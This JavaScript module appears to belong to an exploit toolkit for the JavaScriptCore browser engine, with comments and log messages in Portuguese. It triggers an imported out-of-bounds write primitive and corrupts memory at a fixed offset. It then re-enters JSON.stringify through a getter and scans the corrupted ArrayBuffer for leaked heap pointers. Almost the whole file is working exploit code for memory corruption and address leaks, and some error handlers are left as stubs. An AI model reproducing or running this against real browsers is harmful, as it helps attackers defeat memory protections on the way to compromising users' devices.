// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForStringifierLeakExploit";
let getter_called_flag = false;
let current_test_results = {
    success: false, message: "Teste não iniciado.", error: null,
    leaks_found_in_oob_ab: []
};

const CORRUPTION_OFFSET_TRIGGER = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

const OOB_AB_SCAN_FILL_PATTERN = 0xFEFEFEFE; // Padrão distinto
const OOB_AB_SCAN_AREA_SIZE = 0x800; // Sondar primeiros 2KB

// Objeto global para tentar vazar o endereço (para referência cruzada se encontrarmos um ponteiro)
let global_object_to_leak_addr; 

class CheckpointForStringifierLeakExploit {
    constructor(id) {
        this.id_marker = `StrLeakExploitChkpt-${id}`;
        // Propriedade que pode ser usada pelo Stringifier
        this.initial_prop = "CheckpointProperty"; 
    }

    get [GETTER_CHECKPOINT_PROPERTY_NAME]() {
        getter_called_flag = true;
        const FNAME_GETTER = "StringifierLeakExploit_Getter";
        logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO em 'this' (id: ${this.id_marker})!`, "vuln", FNAME_GETTER);
        
        current_test_results = { // Reset
            success: false, message: "Getter chamado, tentando explorar Stringifier corrompido.",
            error: null, leaks_found_in_oob_ab: [], details:""
        };
        let details_log = [];
        let leak_detected = false;

        try {
            if (!oob_array_buffer_real || !oob_write_absolute || !oob_read_absolute) {
                throw new Error("Dependências OOB R/W ou oob_ab não disponíveis no getter.");
            }

            // 1. Preencher oob_array_buffer_real com um padrão
            logS3("DENTRO DO GETTER: Preenchendo oob_array_buffer_real com padrão...", "info", FNAME_GETTER);
            const fill_limit = Math.min(OOB_AB_SCAN_AREA_SIZE, oob_array_buffer_real.byteLength);
            for (let offset = 0; offset < fill_limit; offset += 4) {
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) continue;
                try { oob_write_absolute(offset, OOB_AB_SCAN_FILL_PATTERN, 4); } catch(e_fill) {}
            }
            details_log.push(`oob_array_buffer_real preenchido com ${toHex(OOB_AB_SCAN_FILL_PATTERN)} até ${toHex(fill_limit)}.`);

            // 2. Criar objeto alvo e objeto de stress para o JSON.stringify interno
            global_object_to_leak_addr = { "secret_marker": 0xCAFED00D + Date.now() }; // Nosso alvo
            
            let stress_obj_for_stringify = {
                str1: "START_" + "S".repeat(128) + "_END1",
                target_ref: global_object_to_leak_addr, // Referência ao objeto alvo
                num_array: Array.from({length: 20}, (_, k) => Math.random() * 0xFFFFFFFF),
                nested_obj: {
                    deep_str: "NESTED_" + "N".repeat(128) + "_DEEP_END",
                    target_ref2: global_object_to_leak_addr
                },
                str2: "FINAL_" + "F".repeat(128) + "_END2"
            };
            // stress_obj_for_stringify.circular = stress_obj_for_stringify; // Evitar por enquanto

            details_log.push(`Objeto de stress (contendo target_ref) criado.`);

            // 3. Chamar JSON.stringify internamente para fazer o Stringifier (corrompido) trabalhar
            logS3("DENTRO DO GETTER: Chamando JSON.stringify INTERNO sobre objeto de stress...", "subtest", FNAME_GETTER);
            let internal_json_out = "";
            try {
                internal_json_out = JSON.stringify(stress_obj_for_stringify);
                details_log.push(`Stringify interno completado. Output length: ${internal_json_out.length}.`);
                logS3(`DENTRO DO GETTER: JSON.stringify interno completado. Output length: ${internal_json_out.length}`, "info", FNAME_GETTER);
            } catch (e_json_int) {
                details_log.push(`Erro no JSON.stringify interno: ${e_json_int.message}`);
                logS3(`DENTRO DO GETTER: Erro no JSON.stringify interno: ${e_json_int.message}`, "error", FNAME_GETTER);
                // Se o erro não for "circular", pode ser um sinal
                if (!String(e_json_int.message).toLowerCase().includes("circular")) {
                     current_test_results.error = `Erro incomum stringify interno: ${e_json_int.message}`;
                     // Não marcar como success ainda, pois queremos um leak
                }
            }

            // 4. Sondar o oob_array_buffer_real por dados vazados (que não sejam o padrão)
            logS3("DENTRO DO GETTER: Sondando oob_array_buffer_real por alterações/vazamentos...", "info", FNAME_GETTER);
            for (let offset = 0; (offset + 8) <= fill_limit; offset += 4) { // Passo de 4, mas lemos 8 para pegar ponteiros
                if (offset === CORRUPTION_OFFSET_TRIGGER || offset === CORRUPTION_OFFSET_TRIGGER + 4) {
                    // Logar o valor da corrupção para referência
                    try {
                        const val_corr_trigger = oob_read_absolute(offset, 4);
                        if (val_corr_trigger !== OOB_AB_SCAN_FILL_PATTERN) {
                             current_test_results.leaks_found_in_oob_ab.push(`oob_data[${toHex(offset)}] (gatilho): ${toHex(val_corr_trigger)}`);
                        }
                    } catch(e){}
                    continue;
                }
                try {
                    // Ler 8 bytes para tentar identificar ponteiros
                    const val64 = oob_read_absolute(offset, 8);
                    // Ler 4 bytes para verificar o padrão de preenchimento
                    const val32_chunk1 = oob_read_absolute(offset, 4);
                    const val32_chunk2 = oob_read_absolute(offset + 4, 4);

                    if (val32_chunk1 !== OOB_AB_SCAN_FILL_PATTERN || val32_chunk2 !== OOB_AB_SCAN_FILL_PATTERN) {
                        const leak_info_str = `ALTERAÇÃO/LEAK em oob_data[${toHex(offset)}] = ${val64.toString(true)} (Padrão esperado: ${toHex(OOB_AB_SCAN_FILL_PATTERN)}${toHex(OOB_AB_SCAN_FILL_PATTERN)})`;
                        logS3(leak_info_str, "leak", FNAME_GETTER);
                        current_test_results.leaks_found_in_oob_ab.push({ offset: toHex(offset), value: val64.toString(true) });
                        leak_detected = true;
                        
                        // Heurística de ponteiro (ajuste os limites conforme necessário)
                        if ((val64.high() > 0x0001 && val64.high() < 0x8000) && (val64.low() !== 0 || val64.high() !== 0)) {
                            logS3(`  -> VALOR SUSPEITO DE PONTEIRO!`, "vuln", FNAME_GETTER);
                        }
                    }
                } catch (e_snoop) { /* ignorar */ }
            }

            if (leak_detected) {
                current_test_results.success = true;
                current_test_results.message = `VAZAMENTO POTENCIAL! Encontradas ${current_test_results.leaks_found_in_oob_ab.length} alterações/escritas no oob_array_buffer_real.`;
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "vuln", FNAME_GETTER);
            } else {
                current_test_results.message = "Nenhuma alteração/vazamento detectado no oob_array_buffer_real após stringify interno.";
                logS3(`DENTRO DO GETTER: ${current_test_results.message}`, "good", FNAME_GETTER);
            }
            current_test_results.details = details_log.join('; ');

        } catch (e_getter_main) {
            logS3(`DENTRO DO GETTER: ERRO PRINCIPAL NO GETTER: ${e_getter_main.message}`, "critical", FNAME_GETTER);
            current_test_results.error = String(e_getter_main);
            current_test_results.message = `Erro principal no getter: ${e_getter_main.message}`;
        }
        return { "getter_processed_stringifier_leak_exploit": true };
    }

    toJSON() {
        const FNAME_toJSON = "CheckpointForStringifierLeakExploit.toJSON";
        logS3(`toJSON para: ${this.id_marker}. Acessando getter...`, "info", FNAME_toJSON);
        // eslint-disable-next-line no-unused-vars
        const _ = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        return { id: this.id_marker, processed_by_str_leak_exploit_test: true };
    }
}

export async function executeRetypeOOB_AB_Test() { 
    const FNAME_TEST_RUNNER = "executeStringifierLeakExploitTestRunner";
    logS3(`--- Iniciando Teste de Leak via Stringifier Corrompido (Agressivo) ---`, "test", FNAME_TEST_RUNNER);

    getter_called_flag = false;
    current_test_results = { /* Reset inicial */ };

    if (!JSC_OFFSETS.ArrayBufferContents /* ... etc ... */) { return; }

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST_RUNNER);
        
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3(`Escrita OOB gatilho em ${toHex(CORRUPTION_OFFSET_TRIGGER)} completada.`, "info", FNAME_TEST_RUNNER);

        const checkpoint_obj = new CheckpointForStringifierLeakExploit(1);
        logS3(`Checkpoint objeto criado: ${checkpoint_obj.id_marker}`, "info", FNAME_TEST_RUNNER);
        
        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST_RUNNER);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) { /* ... */ }

    } catch (mainError_runner) { /* ... */ }
    finally { /* ... */ }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE LEAK STRINGIFIER: SUCESSO ESPECULATIVO! ${current_test_results.message}`, "vuln", FNAME_TEST_RUNNER);
        } else {
            logS3(`RESULTADO TESTE LEAK STRINGIFIER: Getter chamado. ${current_test_results.message}`, "warn", FNAME_TEST_RUNNER);
        }
        if (current_test_results.details) {
             logS3(`  Detalhes da tentativa no getter: ${current_test_results.details}`, "info", FNAME_TEST_RUNNER);
        }
        if (current_test_results.leaks_found_in_oob_ab && current_test_results.leaks_found_in_oob_ab.length > 0) {
            logS3("--- Dados Alterados/Vazados no oob_array_buffer_real ---", "leak", FNAME_TEST_RUNNER);
            current_test_results.leaks_found_in_oob_ab.forEach(info_obj => { // Agora é um array de objetos
                logS3(`  Offset ${info_obj.offset}: ${info_obj.value}`, "leak", FNAME_TEST_RUNNER);
            });
        }
         if (current_test_results.error) { /* ... */ }
    } else { /* ... */ }

    clearOOBEnvironment();
    global_object_to_leak_addr = null;
    logS3(`--- Teste de Leak via Stringifier Corrompido (Agressivo) Concluído ---`, "test", FNAME_TEST_RUNNER);
}
